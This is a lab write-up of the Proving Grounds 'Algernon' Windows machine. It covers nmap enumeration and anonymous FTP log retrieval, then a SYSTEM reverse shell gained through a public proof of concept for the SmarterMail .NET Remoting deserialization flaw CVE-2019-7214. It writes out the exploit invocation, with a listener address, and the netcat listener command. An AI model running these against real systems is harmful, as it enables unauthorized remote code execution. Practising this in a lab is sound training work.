---
machine: Algernon
platform: Proving Grounds
category: Windows
difficulty: Easy
tags: [ftp, anonymous-login, smartermail, deserialization, cve-2019-7214]
date: 2026-07-18
status: retired
summary: A Windows box running a mail server suite alongside a default IIS install — testing anonymous FTP log-diving for service fingerprints and a known deserialization remote-code-execution vulnerability in the mail client's remoting service.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/algernon]
└─$ sudo nmap 192.168.133.65 -p- -T4 -oN portscan                    
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 14:25 -0400
Nmap scan report for target (192.168.133.65)
Host is up (0.056s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
9998/tcp  open  distinct32
17001/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 75.26 seconds

┌──(kali㉿kali)-[~/oscp/algernon]
└─$ sudo nmap 192.168.133.65 -p 21,80,135,139,445,5040,9998,17001 -sCV -T4 -oN portscan
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 14:28 -0400
Nmap scan report for target (192.168.133.65)
Host is up (0.056s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 07-18-26  11:16AM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
9998/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Sat, 18 Jul 2026 18:31:20 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
17001/tcp open  remoting      MS .NET Remoting services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-07-18T18:31:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.16 seconds

```

We see anon access to ftp so we recursively retrieve all files with:
`wget -r --no-passive ftp://anonymous:anonymous@192.168.133.65/`

We also encounter a default IIS webserver

The default FTP server reveals a variety of logs that reveal some subtle info like a delivery log revealing ClamAV is running.

We have a SmarterMail webapp running on port 9998 but we don't have credentials to guess and the default admin:admin fails.

We lookup port 17001 and see that its a counterpart of the smartermail client which is known for a deserialization RCE vulnerability which we will attempt.

## Foothold

I am using this poc:
`https://raw.githubusercontent.com/Drew-Alleman/CVE-2019-7214/refs/heads/main/CVE-2019-7214.py`

```bash
┌──(kali㉿kali)-[~/oscp/algernon]
└─$ python3 CVE-2019-7214.py -l 192.168.45.211 -r 192.168.133.65 
[*] Attacking: tcp://192.168.133.65:17001/Servers
[*] Attempting to send exploit...
[*] Exploit sent! Check your shell at 192.168.45.211:4444
```

```bash
┌──(kali㉿kali)-[~/oscp/algernon]
└─$ rlwrap -cAr nc -lvnp 4444         
listening on [any] 4444 ...
connect to [192.168.45.211] from (UNKNOWN) [192.168.133.65] 49940
whoami
nt authority\system
PS C:\Windows\system32> 
```

Now that we have a SYSTEM shell we can get the Administrator flag and the box is complete.
